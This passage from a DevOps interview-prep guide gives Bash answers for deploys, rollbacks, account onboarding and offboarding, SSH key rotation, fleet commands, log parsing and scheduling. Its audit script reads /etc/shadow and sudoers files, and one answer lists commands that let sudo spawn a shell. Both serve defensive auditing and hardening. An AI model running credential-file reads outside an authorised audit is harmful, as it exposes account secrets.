3. Check capacity first: with 10 instances, losing one at a time must not overload the rest.

**Why →** Draining avoids dropped requests; stopping early limits the blast radius.

**Interview tip →** Mention the target group's deregistration delay (default 300 s) and tuning it for faster rollouts.

</details>

### Q63. After a deploy, the health check fails intermittently. Your script must roll back automatically, but only if the failure persists. How? 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** A single failed probe during warm-up should not trigger rollback; sustained failure should.

**What I'd do →**
```bash
ok=0 fail=0
for _ in $(seq 1 30); do
  if curl -fsS -o /dev/null --max-time 3 http://127.0.0.1:8080/readyz; then
    ok=$((ok + 1)); fail=0
    (( ok >= 5 )) && { echo "healthy"; exit 0; }
  else
    fail=$((fail + 1)); ok=0
    (( fail >= 5 )) && break
  fi
  sleep 2
done
rollback "$previous"; exit 1
```
1. Require 5 consecutive successes to pass and 5 consecutive failures to fail, within an overall deadline.

**Why →** Consecutive-count thresholds smooth out warm-up noise while still failing fast on real breakage.

**Interview tip →** Mention this mirrors Kubernetes `successThreshold`/`failureThreshold` and ALB healthy/unhealthy thresholds.

</details>

### Q64. Implement a blue/green switch on a single nginx host with a script. 🔴

<details>
<summary><b>Answer</b></summary>

**Situation read →** Two app instances (blue on 8081, green on 8082); nginx points at one through an include file.

**What I'd do →**
```bash
active=$(grep -oE '808[12]' /etc/nginx/conf.d/upstream-active.conf)
target=$([[ $active == 8081 ]] && echo 8082 || echo 8081)
deploy_to_port "$target"
wait_for_http "http://127.0.0.1:$target/readyz" 60 || die "new color unhealthy; live traffic untouched"

tmp=$(mktemp /etc/nginx/conf.d/.upstream.XXXXXX)
printf 'upstream app { server 127.0.0.1:%s; }\n' "$target" > "$tmp"
chmod 0644 "$tmp"
mv -f -- "$tmp" /etc/nginx/conf.d/upstream-active.conf
nginx -t && systemctl reload nginx || { echo "nginx config invalid" >&2; exit 1; }
echo "switched $active -> $target; rollback = rerun with previous color"
```
1. The idle color is deployed and tested before any traffic moves.
2. `nginx reload` swaps workers gracefully; existing connections finish on old workers.

**Why →** Rollback is just pointing back at the old color, which is still running.

**Interview tip →** Mention database migrations: they must be backward compatible so both colors can run against the same schema.

</details>

### Q65. Onboard 30 engineers: create accounts and install their SSH keys from their GitHub usernames, idempotently. 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** GitHub publishes public keys at `https://github.com/<user>.keys`. The script must be safe to rerun.

**What I'd do →**
```bash
while IFS=, read -r user gh_user; do
  [[ $user =~ ^[a-z_][a-z0-9_-]{0,31}$ ]] || { echo "skip invalid $user" >&2; continue; }
  id -u "$user" &>/dev/null || useradd --create-home --shell /bin/bash --groups developers "$user"
  install -d -m 0700 -o "$user" -g "$user" "/home/$user/.ssh"
  keys=$(curl -fsS --max-time 10 "https://github.com/${gh_user}.keys") || { echo "no keys for $gh_user" >&2; continue; }
  [[ -n $keys ]] || continue
  tmp=$(mktemp); printf '%s\n' "$keys" > "$tmp"
  install -m 0600 -o "$user" -g "$user" "$tmp" "/home/$user/.ssh/authorized_keys"; rm -f "$tmp"
done < <(tail -n +2 engineers.csv)
```
1. `id -u` check makes `useradd` idempotent; `install` sets owner and mode atomically.
2. Validate usernames before using them in paths.

**Why →** Rerunnable scripts let you fix one bad row and rerun without side effects.

**Interview tip →** Mention that at scale this belongs in config management (Ansible `user` and `authorized_key` modules) or SSO with short-lived certificates.

</details>

### Q66. An engineer leaves the company. Write the offboarding steps for Linux servers. 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** Revoke access immediately, preserve data for handover, and keep an audit trail.

**What I'd do →**
```bash
user=$1
id "$user" &>/dev/null || die "no such user $user"
usermod --lock --expiredate 1 --shell /usr/sbin/nologin "$user"    # no password, no login
pkill -KILL -u "$user" || true                                      # end sessions and processes
rm -f "/home/$user/.ssh/authorized_keys"
rm -f "/etc/sudoers.d/$user"
crontab -r -u "$user" 2>/dev/null || true
tar -czf "/var/backups/offboard/${user}-$(date +%F).tar.gz" -C /home "$user"
logger -t offboard "offboarded $user by ${SUDO_USER:-root}"
```
1. Lock first, delete later (`userdel -r` after the retention period), so file ownership stays readable.
2. Also revoke central access: IAM, SSO, VPN, Git hosting, CI secrets the person could read.

**Why →** Locking keeps UIDs stable for audit and data handover while removing access instantly.

**Interview tip →** Mention that SSH keys bypass a locked password, which is why removing `authorized_keys` matters.

</details>

### Q67. You are asked to audit a server for risky accounts. What does your script check? 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** Look for privilege, missing passwords, passwordless sudo and stray keys.

**What I'd do →**
```bash
awk -F: '$3 == 0 && $1 != "root" {print "UID 0 account:", $1}' /etc/passwd
awk -F: '$2 == "" {print "empty password:", $1}' /etc/shadow
grep -rhE '^[^#].*NOPASSWD' /etc/sudoers /etc/sudoers.d/ 2>/dev/null
awk -F: '$3 >= 1000 && $7 !~ /(nologin|false)$/ {print $1}' /etc/passwd | while read -r u; do
  f="/home/$u/.ssh/authorized_keys"; [[ -s $f ]] && echo "$u: $(grep -c . "$f") key(s)"
done
lastlog -b 90 | awk 'NR > 1 && $0 !~ /Never logged in/ {print "inactive 90d+:", $1}'
```

**Why →** These are the usual paths to unauthorized root: extra UID 0 accounts, blank passwords and unrestricted sudo.

**Interview tip →** Mention running audits as code (CIS benchmarks via Lynis or OpenSCAP) rather than only ad-hoc scripts.

</details>

### Q68. You must rotate the SSH key used by automation across 200 servers without locking yourself out. How? 🔴

<details>
<summary><b>Answer</b></summary>

**Situation read →** Add before remove, verify before cleanup, and do it in batches.

**What I'd do →**
1. Generate the new key: `ssh-keygen -t ed25519 -f ~/.ssh/automation_2026 -C automation-2026 -N ''`.
2. Phase 1, add: append the new public key on every host (idempotent `grep -qxF || echo >>`), using the **old** key.
3. Phase 2, verify: `ssh -i ~/.ssh/automation_2026 -o BatchMode=yes -o IdentitiesOnly=yes host true` on every host; collect failures and fix them.
4. Switch all automation (CI secrets, Ansible config) to the new key; run for a day.
5. Phase 3, remove: delete the old key line with `sed -i "\|$(cut -d' ' -f2 old.pub)|d" ~/.ssh/authorized_keys` using the new key, again verifying access after.
6. Run each phase with `xargs -P 20` and a log per host.

**Why →** At every point at least one working key exists, so a failure never strands a host.

**Interview tip →** Mention SSH certificates (a CA with short-lived certs) as the long-term fix that removes key rotation work.

</details>

### Q69. Run a command on 200 hosts in parallel and produce a summary of which succeeded and failed. 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** Bound concurrency, add timeouts, capture per-host output and exit codes.

**What I'd do →**
```bash
out=$(mktemp -d)
run_one() {
  local h=$1
  if timeout 60 ssh -n -o BatchMode=yes -o ConnectTimeout=5 "$h" 'sudo systemctl is-active app' > "$out/$h.log" 2>&1
  then echo "$h OK"; else echo "$h FAIL($?)"; fi
}
export -f run_one; export out
xargs -a hosts.txt -P 20 -I{} bash -c 'run_one "$1"' _ {} | sort > "$out/summary.txt"
grep -c ' OK' "$out/summary.txt"; grep FAIL "$out/summary.txt" || true
```
1. `-P 20` limits parallel SSH sessions; `-n` stops SSH from reading stdin.
2. Pass the host as an argument (`_ {}`), never into the command string.

**Why →** You get a reproducible summary and per-host logs for the failures, without hammering the network.

**Interview tip →** Mention Ansible ad-hoc (`ansible all -m shell -a ... -f 20`) or `pssh` as ready-made alternatives.

</details>

### Q70. Push an updated nginx config to a fleet, but only reload hosts where the file changed and the config validates. 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** Reloading unchanged hosts is noise; reloading with an invalid config takes the site down.

**What I'd do →**
```bash
for h in "${hosts[@]}"; do
  remote_sum=$(ssh -n "$h" 'sha256sum /etc/nginx/conf.d/app.conf 2>/dev/null | cut -d" " -f1')
  local_sum=$(sha256sum app.conf | cut -d' ' -f1)
  [[ $remote_sum == "$local_sum" ]] && { echo "$h unchanged"; continue; }
  scp -q app.conf "$h:/tmp/app.conf.new"
  ssh -n "$h" 'sudo cp -a /etc/nginx/conf.d/app.conf /etc/nginx/conf.d/app.conf.bak 2>/dev/null;
               sudo install -m 0644 /tmp/app.conf.new /etc/nginx/conf.d/app.conf &&
               sudo nginx -t && sudo systemctl reload nginx ||
               { sudo mv /etc/nginx/conf.d/app.conf.bak /etc/nginx/conf.d/app.conf; exit 1; }' ||
    { echo "$h FAILED, restored previous config" >&2; exit 1; }
done
```

**Why →** Checksums make the operation idempotent; validation plus restore makes it safe.

**Interview tip →** Mention that this is what Ansible's `template` + `validate:` + handler `notify` gives you for free.

</details>

### Q71. In CI, after building image `api:1.4.2`, a script must update the tag in a GitOps repo and open a PR. How? 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** Edit YAML structurally, commit on a branch, push, and open a PR with the CLI.

**What I'd do →**
```bash
export NEW_TAG=1.4.2
git clone --depth 1 "https://x-access-token:${GH_TOKEN}@github.com/acme/gitops.git" && cd gitops
git switch -c "bump-api-$NEW_TAG"
yq -i '.image.tag = strenv(NEW_TAG)' apps/api/values-prod.yaml
git diff --quiet && { echo "already at $NEW_TAG"; exit 0; }
git -c user.name=ci-bot -c user.email=ci@acme.dev commit -am "api: bump image to $NEW_TAG"
git push -u origin HEAD
gh pr create --title "api: $NEW_TAG to prod" --body "Automated bump from build $GITHUB_RUN_ID" --base main
```
1. `yq` with `strenv` keeps formatting and avoids quoting bugs.
2. `git diff --quiet` makes reruns harmless.

**Why →** GitOps requires the change to land through Git with review, not via `kubectl set image`.

**Interview tip →** Mention that tools like Argo CD Image Updater or Renovate can do this automatically.

</details>

### Q72. A deploy script runs `kubectl apply` and must fail the pipeline, and roll back, if the rollout does not complete. Write it. 🟢

<details>
<summary><b>Answer</b></summary>

**Situation read →** `kubectl apply` returns success as soon as the API accepts the object, not when pods are healthy.

**What I'd do →**
```bash
kubectl apply -f k8s/
if ! kubectl rollout status deployment/api -n prod --timeout=180s; then
  echo "rollout failed, undoing" >&2
  kubectl rollout undo deployment/api -n prod
  kubectl rollout status deployment/api -n prod --timeout=180s || true
  exit 1
fi
```
1. `rollout status` waits for the new ReplicaSet to be fully available and exits non-zero on timeout or progress deadline.
2. Set `progressDeadlineSeconds` in the Deployment so Kubernetes itself marks a stuck rollout as failed.

**Why →** Without waiting, CI goes green while pods crash-loop.

**Interview tip →** Mention that with GitOps, rollback means reverting the Git commit, not `rollout undo`.

</details>

### Q73. Three app servers run the same deploy script, and each tries to run database migrations at the same time. How do you ensure only one does? 🔴

<details>
<summary><b>Answer</b></summary>

**Situation read →** `flock` only works on one host. You need a lock that all hosts share.

**What I'd do →**
1. Use the database itself as the lock: Postgres advisory locks are held for the session.
   ```bash
   psql -v ON_ERROR_STOP=1 <<'SQL'
   SELECT pg_advisory_lock(424242);
   \! ./migrate up
   SELECT pg_advisory_unlock(424242);
   SQL
   ```
   Most migration tools (Flyway, Liquibase, Alembic with care, golang-migrate) already take such a lock.
2. Or run migrations once, as a separate pipeline step or a Kubernetes Job, before rolling out app servers.
3. Alternatives: a DynamoDB conditional write, Consul or etcd locks.

**Why →** Concurrent migrations can apply a change twice or interleave DDL, corrupting the schema.

**Interview tip →** The cleanest answer is "migrations are a separate, single step in the pipeline". Locks are a fallback.

</details>

### Q74. During a deploy you show a maintenance page. If the deploy fails, the page stayed up last time. Fix the script. 🟢

<details>
<summary><b>Answer</b></summary>

**Situation read →** The removal step was at the end of the happy path, so any failure skipped it.

**What I'd do →**
```bash
maintenance_on()  { touch /srv/app/shared/maintenance.flag; }
maintenance_off() { rm -f /srv/app/shared/maintenance.flag; }

maintenance_on
trap maintenance_off EXIT
run_migrations
switch_release
```
1. nginx serves the page when the flag exists: `if (-f /srv/app/shared/maintenance.flag) { return 503; }` with an `error_page 503`.
2. The `EXIT` trap removes it on success, failure, or Ctrl+C.

**Why →** Traps make cleanup independent of which line failed.

**Interview tip →** Mention that a 503 with a `Retry-After` header is better for clients and SEO than a 200 maintenance page.

</details>

### Q75. A CI pipeline deploys to servers over SSH. The first run fails with `Host key verification failed.` A teammate suggests `StrictHostKeyChecking=no`. What do you do? 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** The runner has no `known_hosts` entry. Disabling checking removes protection against man-in-the-middle attacks on your deploy path.

**What I'd do →**
1. Store the servers' host keys as a CI variable (collected once from a trusted source, for example the instance's console output or your config management), and write them in the job:
   ```bash
   install -d -m 0700 ~/.ssh
   printf '%s\n' "$KNOWN_HOSTS" > ~/.ssh/known_hosts
   chmod 0644 ~/.ssh/known_hosts
   ```
2. Load the deploy key from a secret with `ssh-agent`, never write it with loose permissions.
3. Use `-o BatchMode=yes` so failures are immediate.
4. For dynamic fleets, use SSH host certificates signed by your CA, and `@cert-authority` in `known_hosts`.

**Why →** Host key checking is the only thing proving you are talking to your server and not an attacker.

**Interview tip →** Refusing `StrictHostKeyChecking=no` politely, with an alternative, is the answer interviewers want.

</details>

### Q76. A contractor needs sudo on one server for two hours. How do you grant it so it expires automatically? 🔴

<details>
<summary><b>Answer</b></summary>

**Situation read →** Manual revocation gets forgotten. Make expiry part of the grant.

**What I'd do →**
1. Write a validated sudoers drop-in:
   ```bash
   f=/etc/sudoers.d/90-tmp-contractor
   tmp=$(mktemp)
   echo 'contractor ALL=(ALL) /usr/bin/systemctl restart app, /usr/bin/journalctl' > "$tmp"
   visudo -cf "$tmp" && install -m 0440 "$tmp" "$f"; rm -f "$tmp"
   ```
2. Schedule removal with a transient systemd timer: `systemd-run --on-active=2h --unit=revoke-contractor rm -f "$f"` (or `at now + 2 hours`).
3. Scope commands narrowly; avoid `ALL` and anything that can spawn a shell (`vi`, `less`, `find -exec`).
4. Log the grant and the revocation with `logger`.

**Why →** `visudo -c` prevents a syntax error from breaking sudo for everyone; timed removal prevents forgotten access.

**Interview tip →** Mention just-in-time access tools (Teleport, AWS SSM with IAM conditions) as the scalable version.

</details>

### Q77. Report which servers in a fleet have a different version of `openssl` installed than the approved one. 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** Collect versions in parallel, compare to the baseline, report drift.

**What I'd do →**
```bash
approved="3.0.13-0ubuntu3.4"
ver() {
  local v
  v=$(ssh -n -o BatchMode=yes -o ConnectTimeout=5 "$1" "dpkg-query -W -f='\${Version}' openssl" 2>/dev/null) || v=unreachable
  echo "$1 ${v:-missing}"
}
export -f ver
xargs -a hosts.txt -P 20 -I{} bash -c 'ver "$1"' _ {} |
  awk -v a="$approved" '$2 != a {print "DRIFT", $0}' | sort
```
1. `dpkg-query -W -f='${Version}'` gives a clean version string (`rpm -q --qf '%{VERSION}-%{RELEASE}'` on RHEL). The `\$` and inner single quotes keep `${Version}` from being expanded by either the local or the remote shell.
2. Unreachable hosts appear as drift so they are not silently skipped.

**Why →** Version drift is how one unpatched server survives a CVE rollout.

**Interview tip →** Mention AWS SSM Inventory or osquery for continuous fleet inventory.

</details>

### Q78. An EC2 instance's user-data Bash script sometimes fails half-way, and you cannot see why. How do you debug and harden it? 🟢

<details>
<summary><b>Answer</b></summary>

**Situation read →** User data runs once at first boot via cloud-init, as root, with no terminal.

**What I'd do →**
1. Read the logs: `/var/log/cloud-init-output.log` (script output) and `/var/log/cloud-init.log`; the script itself is at `/var/lib/cloud/instance/scripts/part-001`.
2. Add `#!/bin/bash`, `set -Eeuxo pipefail`, and an `ERR` trap that logs the line.
3. Wait for network and package locks: retry `apt-get update` with backoff; `cloud-init status --wait` in dependent steps.
4. Make steps idempotent so `cloud-init clean && reboot` (or rerunning the script) is safe.
5. Signal completion or failure (for example `cfn-signal`, an ASG lifecycle hook, or a tag), so failures are visible.

**Why →** First-boot scripts fail on timing (network not ready, apt locks), and without logs and signals nobody notices.

**Interview tip →** Mention baking images with Packer to move most of user data out of boot time.

</details>

### Q79. After patching, services must be restarted in order: database, then API, then web, each healthy before the next. Script it. 🟢

<details>
<summary><b>Answer</b></summary>

**Situation read →** Ordered restart with a health gate per step, stopping on the first failure.

**What I'd do →**
```bash
declare -A check=(
  [postgresql]='pg_isready -q'
  [api]='curl -fsS -o /dev/null --max-time 3 http://127.0.0.1:8080/readyz'
  [nginx]='curl -fsS -o /dev/null --max-time 3 http://127.0.0.1/'
)
for svc in postgresql api nginx; do
  systemctl restart "$svc"
  for _ in {1..30}; do bash -c "${check[$svc]}" && continue 2; sleep 2; done
  echo "$svc not healthy after restart, stopping" >&2; exit 1
done
echo "all services healthy"
```
1. `continue 2` jumps to the next service once its check passes.
2. The array keeps order explicit (associative arrays do not preserve it; the `for` list does).

**Why →** Restarting dependents before their dependency is healthy just creates a second wave of errors.

**Interview tip →** Mention systemd `After=`/`Requires=` for boot ordering, and that health gating still needs a check like this.

</details>

### Q80. You deploy to one canary host first and want to proceed only if its error rate is not worse than the rest. How do you script the decision? 🔴

<details>
<summary><b>Answer</b></summary>

**Situation read →** Compare canary and baseline error rates over comparable recent traffic, with a minimum request count to avoid noise.

**What I'd do →**
```bash
rate() {  # rate HOST -> "errors total" for the most recent 5,000 requests
  ssh -n "$1" "tail -n 5000 /var/log/nginx/access.log" |
    awk '{t++; if ($9 ~ /^5/) e++} END {print e+0, t+0}'
}
read -r ce ct < <(rate "$canary")
be=0 bt=0; for h in "${baseline[@]}"; do read -r e t < <(rate "$h"); be=$((be + e)); bt=$((bt + t)); done
(( ct >= 500 )) || die "canary has only $ct requests; not enough data"
awk -v ce="$ce" -v ct="$ct" -v be="$be" -v bt="$bt" \
  'BEGIN {c = ce / ct; b = (bt ? be / bt : 0); printf "canary %.3f%% baseline %.3f%%\n", 100*c, 100*b
          exit !(c <= b * 1.5 + 0.001)}' || { rollback "$canary"; exit 1; }
echo "canary healthy, continuing rollout"
```

**Why →** Relative comparison handles normal background errors; a minimum sample avoids judging on 10 requests.

**Interview tip →** Mention that Argo Rollouts or Flagger automate this with Prometheus queries, and that latency matters as much as errors.

</details>

## Scenarios: text processing and scheduling decisions

<!-- DEVOPS-SHACK:SECTION -->
> 🎥 **Learn this hands-on with DevOps Shack** → [YouTube @devopsshack](https://www.youtube.com/@devopsshack) · [Hindi @shackverse](https://www.youtube.com/@shackverse) · [Courses at devopsshack.com](https://devopsshack.com)

### Q81. Users report errors in the last hour. From the Nginx access log, find which endpoints produce the most 5xx responses. 🟢

<details>
<summary><b>Answer</b></summary>

**Situation read →** Filter by time and status, strip query strings, count per path.

**What I'd do →**
```bash
since=$(date -d '1 hour ago' '+%d/%b/%Y:%H')
awk -v s="$since" '$4 >= "["s && $9 ~ /^5/ {split($7, p, "?"); print $9, p[1]}' /var/log/nginx/access.log |
  sort | uniq -c | sort -rn | head -n 15
```
1. Field 9 is the status, field 7 the request path in the combined format.
2. Dropping the query string groups `/api/orders?id=1` and `?id=2` together.
3. The string comparison on `$4` works within a single day; for windows across midnight, use epoch conversion or `journalctl --since` if logs go to the journal.

**Why →** Grouping by endpoint turns 50,000 error lines into "it is `/api/checkout`".

**Interview tip →** Mention checking `$upstream_status` or upstream response time fields too, to separate nginx errors from backend errors.

</details>

### Q82. A MySQL slow log is 3 GB. You need the 10 slowest query patterns. What do you do? 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** Raw greps show individual queries; you want patterns (normalized queries) with total and max time.

**What I'd do →**
1. Use the right tool first: `pt-query-digest /var/log/mysql/slow.log > report.txt` (Percona Toolkit) or `mysqldumpslow -s t -t 10 slow.log`.
2. If neither is installed, extract `Query_time` with awk:
   ```bash
   awk '/^# Query_time:/ {t = $3; next}
        /^(SELECT|UPDATE|DELETE|INSERT)/ {q = $0; gsub(/[0-9]+/, "N", q); gsub(/'"'"'[^'"'"']*'"'"'/, "S", q)
                                          sum[q] += t; n[q]++; if (t > max[q]) max[q] = t}
        END {for (q in sum) printf "%.1f\t%d\t%.2f\t%s\n", sum[q], n[q], max[q], substr(q, 1, 120)}' slow.log |
     sort -rn | head
   ```
3. Run it on a copy or with `nice`, not on a busy database host's disk.

**Why →** Normalizing literals groups thousands of executions of the same query, which is what you optimize.

**Interview tip →** Lead with `pt-query-digest`; reaching for the right tool beats clever awk.

</details>

### Q83. Two servers that should be identical behave differently. Compare their installed packages. 🟢

<details>
<summary><b>Answer</b></summary>

**Situation read →** Generate normalized package lists from both and diff them.

**What I'd do →**
```bash
pkgs() { ssh -n "$1" "dpkg-query -W -f='\${Package} \${Version}\n'" | sort; }
diff <(pkgs web1) <(pkgs web2)
# names only, regardless of version
comm -3 <(pkgs web1 | cut -d' ' -f1) <(pkgs web2 | cut -d' ' -f1)
```
1. On RHEL: `rpm -qa --qf '%{NAME} %{VERSION}-%{RELEASE}\n' | sort`.
2. Extend to configs: `diff <(ssh web1 cat /etc/sysctl.conf) <(ssh web2 cat /etc/sysctl.conf)`.

**Why →** Process substitution makes remote comparisons one-liners without temp files.

**Interview tip →** Mention that drift like this is the argument for immutable images or config management.

</details>

### Q84. Find which pods were OOMKilled in a namespace, with their container names and restart counts. 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** The last termination reason is in each container's status.

**What I'd do →**
```bash
kubectl get pods -n prod -o json | jq -r '
  .items[] | .metadata.name as $pod
  | .status.containerStatuses[]?
  | select(.lastState.terminated.reason == "OOMKilled")
  | [$pod, .name, .restartCount, .lastState.terminated.finishedAt] | @tsv' | column -t
```
1. `as $pod` keeps the pod name while iterating containers.
2. `[]?` skips pods without container statuses (pending).
3. Compare with limits: `kubectl get pod POD -o jsonpath='{.spec.containers[*].resources.limits.memory}'`.

**Why →** OOM kills hide behind generic `CrashLoopBackOff`; this lists them directly.

**Interview tip →** Mention that `kubectl get events --field-selector reason=OOMKilling` shows node-level OOMs, which are different from container limit kills.

</details>

### Q85. Produce a CSV of running EC2 instances that are missing an `Owner` tag. 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** Tags are an array of Key/Value pairs; test for the absence of one key.

**What I'd do →**
```bash
echo "region,instance_id,name,type,launch_time" > untagged.csv
for r in $(aws ec2 describe-regions --query 'Regions[].RegionName' --output text); do
  aws ec2 describe-instances --region "$r" --filters Name=instance-state-name,Values=running --output json |
  jq -r --arg r "$r" '.Reservations[].Instances[]
    | select([.Tags[]? | .Key] | index("Owner") | not)
    | [$r, .InstanceId, ((.Tags // []) | from_entries | .Name // ""), .InstanceType, .LaunchTime] | @csv' >> untagged.csv
done
```
1. `from_entries` turns the Key/Value tag list into an object.
2. `@csv` quotes fields correctly.

**Why →** Untagged resources have no owner to ask before cost cleanup or incident response.

**Interview tip →** Mention enforcing tags at creation with AWS Organizations tag policies or SCPs, rather than only reporting.

</details>

### Q86. You have access logs from five web servers and need one timeline sorted by time. How? 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** Each file is already sorted, so merge rather than re-sort, and tag lines with their source.

**What I'd do →**
1. If logs use ISO 8601 timestamps at line start, a merge sort is enough:
   ```bash
   for h in web{1..5}; do ssh -n "$h" 'cat /var/log/app/app.log' | sed "s/^/$h /" > "/tmp/$h.log"; done
   sort -m -k2,2 /tmp/web*.log > timeline.log
   ```
2. For Nginx's `[09/Nov/2026:14:23:01 +0000]` format, convert to a sortable key first (epoch via gawk `mktime`), then sort numerically.
3. Make sure clocks were synchronized, or the merged timeline lies.

**Why →** `sort -m` is linear on pre-sorted input; ISO timestamps sort correctly as strings.

**Interview tip →** Say this is the argument for ISO 8601 UTC timestamps everywhere and for central logging.

</details>

### Q87. A vendor needs application logs, but they contain emails and card numbers. Mask them first. 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** Redact with regexes, verify nothing remains, and share only what is needed.

**What I'd do →**
```bash
sed -E \
  -e 's/[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,}/<email>/g' \
  -e 's/\b[0-9]{4}[ -]?[0-9]{4}[ -]?[0-9]{4}[ -]?[0-9]{1,4}\b/<card>/g' \
  -e 's/(Authorization: Bearer )[A-Za-z0-9._-]+/\1<token>/g' \
  app.log > app.redacted.log
grep -cE '[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,}' app.redacted.log   # expect 0
```
1. Verify with a second pass that searches for the patterns again.
2. Reduce scope first (time window, relevant request IDs) so less data leaves.

**Why →** Logs are a frequent source of PII and secrets leaks; regex redaction plus verification is the minimum.

**Interview tip →** Mention fixing the root cause: applications should not log card numbers at all (PCI DSS).

</details>

### Q88. Convert a `.env` file into a Kubernetes Secret manifest without committing plaintext. 🟢

<details>
<summary><b>Answer</b></summary>

**Situation read →** `kubectl` can build the manifest; encryption must happen before it reaches Git.

**What I'd do →**
```bash
kubectl create secret generic api-env --from-env-file=.env -n prod --dry-run=client -o yaml > secret.yaml
kubeseal --format yaml < secret.yaml > sealed-secret.yaml && rm -f secret.yaml   # Sealed Secrets
# or: sops --encrypt --in-place secret.yaml
```
1. `--from-env-file` handles `KEY=value` lines and base64-encodes values.
2. Commit only the sealed or SOPS-encrypted file.

**Why →** Kubernetes Secrets are only base64, not encryption; committing them is committing plaintext.

**Interview tip →** Mention External Secrets Operator as the alternative that keeps secrets in AWS Secrets Manager or Vault.

</details>

### Q89. From JSON Lines application logs, count unique users per day. 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** Extract (date, user) pairs, de-duplicate, count per date.

**What I'd do →**
```bash
jq -r 'select(.user_id != null) | "\(.ts[0:10]) \(.user_id)"' app-*.jsonl |
  sort -u | awk '{n[$1]++} END {for (d in n) print d, n[d]}' | sort
```
1. `.ts[0:10]` slices the date from an ISO timestamp.
2. `sort -u` removes duplicate (date, user) pairs; awk counts per day.
3. For huge files, `LC_ALL=C sort -u -S 1G --parallel=4`.

**Why →** De-duplicating pairs before counting is the shell equivalent of `COUNT(DISTINCT user_id) GROUP BY day`.

**Interview tip →** Mention handling lines that are not JSON with `jq -R 'fromjson? | ...'`.

</details>

### Q90. Find configuration differences between the staging and prod Helm values files. 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** Textual diffs are noisy because of key order and formatting; normalize first.

**What I'd do →**
```bash
diff <(yq -P 'sort_keys(..)' values-staging.yaml) <(yq -P 'sort_keys(..)' values-prod.yaml)

# flat path=value view, easy to read and grep
flat() { yq -o=json '.' "$1" | jq -r 'paths(scalars) as $p | "\($p | map(tostring) | join("."))=\(getpath($p))"' | sort; }
diff <(flat values-staging.yaml) <(flat values-prod.yaml)
```
1. `sort_keys(..)` sorts keys recursively, so order does not matter.
2. The flattened form shows exactly which path differs (`resources.limits.memory=512Mi`).

**Why →** Normalized diffs show real configuration drift between environments.

**Interview tip →** Mention `helm diff upgrade` for comparing rendered manifests against what is deployed.

</details>

### Q91. You are adding a new scheduled job on Ubuntu 24.04 servers. Cron or a systemd timer? 🟢

<details>
<summary><b>Answer</b></summary>

**Situation read →** Both work; timers give more operational features on systemd hosts.

**What I'd do →**
1. Choose a systemd timer by default: logs in the journal, `systemctl list-timers` for next/last run, `Persistent=true` for missed runs, no overlapping runs, `RandomizedDelaySec=`, sandboxing, `OnFailure=` alerting.
2. Choose cron when the job must be portable to non-systemd systems or containers, or the team manages crontabs centrally and the job is trivial.
3. Either way: absolute paths, locking, timeouts, and logs.

**Why →** Timers solve most of the classic cron pain (environment surprises, silent failures, overlaps) out of the box.

**Interview tip →** Name three concrete timer advantages; "it's newer" is not an answer.

</details>

### Q92. A job must run every 10 minutes, only on weekdays, between 09:00 and 18:00 IST, while servers run in UTC. Write the schedule. 🟢

<details>
<summary><b>Answer</b></summary>

**Situation read →** Express the time zone explicitly so it does not depend on the host setting.

**What I'd do →**
```ini
# systemd timer
[Timer]
OnCalendar=Mon..Fri *-*-* 09..17:00/10:00 Asia/Kolkata
```
```text
# cronie (supports CRON_TZ)
CRON_TZ=Asia/Kolkata
*/10 9-17 * * 1-5 /opt/jobs/sync.sh
```
1. `09..17` with every 10 minutes ends at 17:50; add `18:00` separately if the last run must be at 18:00.
2. Verify: `systemd-analyze calendar --iterations=5 'Mon..Fri *-*-* 09..17:00/10:00 Asia/Kolkata'`.

**Why →** Explicit time zones remove ambiguity, and validating the expression avoids surprises.

**Interview tip →** Mention that Debian's Vixie cron ignores `CRON_TZ`, so test which cron you have.

</details>

### Q93. You must migrate 40 crontab entries from a legacy server to systemd timers. How do you do it safely? 🔴

<details>
<summary><b>Answer</b></summary>

**Situation read →** Each job has implicit behaviour (environment, user, output mailing) that must be preserved or replaced deliberately.

**What I'd do →**
1. Inventory: `crontab -l -u` for every user, `/etc/crontab`, `/etc/cron.d/*`, `/etc/cron.*/`; record schedule, user, command, environment lines (`PATH`, `MAILTO`, `SHELL`).
2. For each job, create `job.service` (`Type=oneshot`, `User=`, `Environment=` or `EnvironmentFile=`, `WorkingDirectory=`) and `job.timer` with an equivalent `OnCalendar=`, verified with `systemd-analyze calendar`.
3. Replace `MAILTO` with `OnFailure=` alerting; drop `flock` wrappers (timers do not overlap), keep `timeout` behaviour via `TimeoutStartSec=`.
4. Generate units with a script or Ansible template from the inventory, not by hand.
5. Cut over in batches: enable the timer, comment the cron line in the same change, compare a few runs (`journalctl -u job`) with previous behaviour.
6. Keep the old crontab backed up for rollback.

**Why →** Most migration bugs come from environment differences and lost failure emails.

**Interview tip →** Mention testing each service with `systemctl start job.service` before enabling its timer.

</details>

### Q94. A cleanup job runs from cron on all 3 nodes of a cluster but must execute on exactly one. How do you do it? 🔴

<details>
<summary><b>Answer</b></summary>

**Situation read →** Local locks do not coordinate across hosts. You need leader election or a shared lock.

**What I'd do →**
1. Simplest: schedule it in one place (a single admin host, a Kubernetes CronJob with `concurrencyPolicy: Forbid`, or a CI schedule).
2. If it must run from the nodes, use a shared lock with a TTL:
   ```bash
   # DynamoDB conditional put as a lock that expires after 30 minutes
   now=$(date +%s)
   aws dynamodb put-item --table-name locks \
     --item "{\"id\":{\"S\":\"cleanup\"},\"owner\":{\"S\":\"$(hostname)\"},\"exp\":{\"N\":\"$((now + 1800))\"}}" \
     --condition-expression 'attribute_not_exists(id) OR exp < :now' \
